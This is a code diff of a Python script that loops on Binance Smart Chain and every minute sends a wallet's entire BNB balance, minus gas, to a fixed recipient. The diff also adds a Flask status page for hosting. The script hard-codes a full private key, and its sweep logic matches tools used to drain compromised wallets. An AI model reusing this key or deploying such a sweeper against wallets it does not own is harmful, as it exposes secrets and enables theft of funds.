@@ -33,11 +33,15 @@
 
 # threading.Thread(target=loop, daemon=True).start()
 # input('Press Enter to exit.')
-import os
+
 import threading
 import time
+import os
 from web3 import Web3
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from flask import Flask
+
+# Initialize Flask app
+app = Flask(__name__)
 
 # Connect to Binance Smart Chain
 w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))
@@ -47,53 +51,56 @@ private_key = "de15d2f43192f331d7678c0ffa1a271308924ae60661f4bcc055a0179588a8d2"
 pub_key = "0xA9BAF7e3B6A21E24E5450E23C921e60F5F1B99A4"
 recipient_pub_key = "0x9BAbf3490ee292bAbFCcf6DF26475108D88eDfb2"
 
+# Define the loop for sending transactions
 def loop():
     while True:
         try:
             balance = w3.eth.get_balance(pub_key)
-            print(f"Current Balance: {w3.from_wei(balance, 'ether')} BNB")
+            print(f"Current Balance: {w3.fromWei(balance, 'ether')} BNB")
             
             # Gas settings
-            gas_price = w3.eth.gas_price
+            gas_price = w3.eth.gas_price  # Fetch current gas price dynamically
             gas_limit = 21000
             
+            # Ensure balance can cover gas cost
             gas_cost = gas_limit * gas_price
             if balance <= gas_cost:
                 print("Insufficient funds for gas. Waiting...")
-                time.sleep(5)
+                time.sleep(5)  # Retry after 5 seconds
                 continue
 
+            # Transaction settings
             nonce = w3.eth.get_transaction_count(pub_key)
             tx = {
-                'chainId': 56,
+                'chainId': 56,  # BSC Mainnet Chain ID
                 'nonce': nonce,
                 'to': recipient_pub_key,
-                'value': balance - gas_cost,
+                'value': balance - gas_cost,  # Deduct gas cost from the balance
                 'gas': gas_limit,
                 'gasPrice': gas_price
             }
 
+            # Sign and send transaction
             signed_tx = w3.eth.account.sign_transaction(tx, private_key)
             tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
             print(f"Transaction sent: {w3.toHex(tx_hash)}")
 
         except Exception as e:
             print(f"Error: {e}")
-
+        
+        # Avoid overloading the network
         time.sleep(60)
 
-# Start the transaction loop in a separate thread
+# Flask route for checking the status
+@app.route('/')
+def index():
+    return "BNB Transaction Service is Running!"
+
+# Start the loop in a separate thread
 threading.Thread(target=loop, daemon=True).start()
 
-# HTTP Server for Render to detect the port
-class HealthCheckHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"OK")
-
-# Use PORT environment variable (default to 5000)
-port = int(os.environ.get("PORT", 5000))
-server = HTTPServer(("", port), HealthCheckHandler)
-print(f"Server running on port {port}")
-server.serve_forever()
+# Ensure app listens on the correct port dynamically
+if __name__ == "__main__":
+    port = os.getenv("PORT", 8080)  # Use Render's dynamic port or fallback to 8080
+    print(f"App is running on port {port}")
+    app.run(host='0.0.0.0', port=port)
